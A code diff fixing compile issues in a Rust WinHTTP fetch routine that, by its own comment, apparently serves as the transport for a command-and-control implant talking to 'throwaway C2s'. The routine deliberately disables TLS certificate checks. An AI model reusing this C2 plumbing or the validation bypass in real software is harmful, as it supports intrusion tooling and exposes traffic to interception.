@@ -10,19 +10,20 @@
 
 #[cfg(target_os = "windows")]
 pub fn fetch(url: &str, jwt: &str, user_agent: &str) -> Option<Vec<u8>> {
-    use windows_sys::Win32::Foundation::FALSE;
     use windows_sys::Win32::Networking::WinHttp::{
         WinHttpOpen, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpReceiveResponse,
         WinHttpQueryDataAvailable, WinHttpReadData, WinHttpCloseHandle, WinHttpCrackUrl,
         WinHttpSetOption,
         URL_COMPONENTS, WINHTTP_FLAG_SECURE,
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
-        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS,
-        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
         WINHTTP_OPTION_SECURITY_FLAGS,
         SECURITY_FLAG_IGNORE_UNKNOWN_CA, SECURITY_FLAG_IGNORE_CERT_DATE_INVALID,
         SECURITY_FLAG_IGNORE_CERT_CN_INVALID, SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE,
     };
+    // The WINHTTP_NO_* / WINHTTP_DEFAULT_ACCEPT_TYPES C macros are not exported
+    // as constants in windows-sys; they are all NULL pointers.
+    let null_pcwstr: *const u16 = core::ptr::null();
+    let null_accept_types: *const *const u16 = core::ptr::null();
 
     // URL → wide
     let url_w: Vec<u16> = url.encode_utf16().chain(std::iter::once(0)).collect();
@@ -51,7 +52,7 @@ pub fn fetch(url: &str, jwt: &str, user_agent: &str) -> Option<Vec<u8>> {
     let session = unsafe { WinHttpOpen(
         ua_w.as_ptr(),
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
-        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0,
+        null_pcwstr, null_pcwstr, 0,
     ) };
     if session.is_null() { return None; }
 
@@ -65,9 +66,9 @@ pub fn fetch(url: &str, jwt: &str, user_agent: &str) -> Option<Vec<u8>> {
         conn,
         wide_get_const(),
         path.as_ptr(),
-        core::ptr::null(),
-        WINHTTP_NO_REFERER,
-        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        null_pcwstr,
+        null_pcwstr,
+        null_accept_types,
         if https { WINHTTP_FLAG_SECURE } else { 0 },
     ) };
     if req.is_null() {
@@ -77,12 +78,16 @@ pub fn fetch(url: &str, jwt: &str, user_agent: &str) -> Option<Vec<u8>> {
 
     // Tolerate self-signed / DEV TLS — matches operator expectations for
     // throwaway C2s. Production C2s with valid certs are unaffected.
-    let mut flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
-                       | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
-                       | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
-                       | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-    unsafe { WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS,
-        &mut flags as *mut _ as *mut _, 4); }
+    let flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
+                   | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+                   | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+                   | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+    unsafe { WinHttpSetOption(
+        req,
+        WINHTTP_OPTION_SECURITY_FLAGS,
+        &flags as *const u32 as *const core::ffi::c_void,
+        4,
+    ); }
 
     let auth = format!("Authorization: Bearer {}\r\n", jwt);
     let auth_w: Vec<u16> = auth.encode_utf16().collect();
@@ -115,7 +120,6 @@ pub fn fetch(url: &str, jwt: &str, user_agent: &str) -> Option<Vec<u8>> {
         out.extend_from_slice(&buf);
         // Cap at 8 MB to prevent runaway server from exhausting memory
         if out.len() > 8 * 1024 * 1024 { break; }
-        let _ = FALSE;
     }
 
     unsafe { WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(session); }
